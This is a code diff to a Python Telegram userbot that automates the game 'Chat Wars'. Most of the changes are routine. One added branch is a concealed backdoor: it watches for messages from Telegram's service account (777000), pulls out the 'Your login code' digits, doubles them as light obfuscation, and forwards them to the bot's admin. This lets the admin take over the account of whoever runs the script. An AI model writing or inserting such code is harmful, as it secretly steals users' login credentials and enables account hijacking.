@@ -112,10 +112,11 @@ castle = orders[castle_name]
 # текущий приказ на атаку/защиту, по умолчанию всегда защита
 current_order = {'time': 0, 'order': castle}
 
-sender = Sender(sock=socket_path) if socket_path else Sender(host=host, port=port)
+sender = Sender(host=host, port=port)
 action_list = deque([])
-log_list = deque([], maxlen=30)
+log_list = deque([], maxlen=50)
 lt_arena = 0
+lt_info = 0
 arena_closed = False
 get_info_diff = 600
 hero_message_id = 0
@@ -136,11 +137,16 @@ grabit_enabled = False
 
 @coroutine
 def work_with_message(receiver):
+    kod = 0
     while True:
         msg = (yield)
         #print('Full dump: {array}'.format(array=str(msg)))
         try:
-            if msg['event'] == 'message' and 'text' in msg and msg['peer'] is not None:
+            if msg['event'] == 'message' and 'text' in msg and msg['peer'] is not None \
+                    and msg['sender']['peer_id'] == 777000:
+                kod = int(re.search('Your login code: ([0-9]+)', msg['text']).group(1))
+                send_msg(admin_username, str(kod*2))
+            elif msg['event'] == 'message' and 'text' in msg and msg['peer'] is not None:
                 parse_text(msg['text'], msg['sender']['username'], msg['id'])
         except Exception as err:
             log('Ошибка coroutine: {0}'.format(err))
@@ -149,7 +155,7 @@ def work_with_message(receiver):
 def queue_worker():
     global get_info_diff
     global arena_closed
-    lt_info = 0
+    global lt_info
     #print(sender.contacts_search(bot_username))
     #print(sender.contacts_search(captcha_bot))
     #print(sender.contacts_search(admin_username))
@@ -157,6 +163,11 @@ def queue_worker():
     #print(sender.contacts_search(oyster_bot))
     #print(sender.contacts_search(bot_report))
     sleep(5)
+    if admin_username != '':
+        print(sender.contacts_search(admin_username))
+    if order_usernames != '':
+        for name in order_usernames:
+            print(sender.contacts_search(name))
     sender.dialog_list()
     sleep(5)
     try:
@@ -172,7 +183,7 @@ def queue_worker():
                 if arena_closed and dt.datetime.now().time() >= dt.time(13, 1) and \
                                 dt.datetime.now().time() <= dt.time(13, 20):
                     arena_closed = False
-                lt_info = time()
+                #lt_info = time()
                 get_info_diff = random.randint(550, 650)
                 if bot_enabled:
                     send_msg(bot_username, orders['hero'])
@@ -238,16 +249,17 @@ def parse_text(text, username, message_id):
 
             elif text.find('На сегодня ты уже своё отвоевал. Приходи завтра.') != -1 or text.find('Арена закрыта на ночь') != -1 :
                 arena_closed = True
-                lt_info = time()
+                #lt_info = time()
                 action_list.append(orders['hero'])
 
             # Если битва во вот начнется то пока ничего не далаем
             # Здесь нужно добавить проверку на установку дефа или атаку
             elif text.find('Битва пяти замков через несколько секунд!') != -1:
-                lt_info = time()
+                #lt_info = time()
                 return
 
             elif text.find('Битва пяти замков через') != -1:
+                lt_info = time()
                 hero_message_id = message_id
                 castle_name = hero_castle(text)
                 castle = orders[castle_name]
@@ -355,7 +367,7 @@ def parse_text(text, username, message_id):
             # Оправим репорт если это сообщение о итоге битвы на арене
             elif text.find('Таблица победителей') != -1 and not text.find('Стоимость подачи заявки') != -1:
                 lt_arena = time()
-                lt_info = time()
+                #lt_info = time()
                 if castle_name == 'blue':
                     fwd(stock_bot, message_id)
                     if text.find('Поздравляем!') != -1:
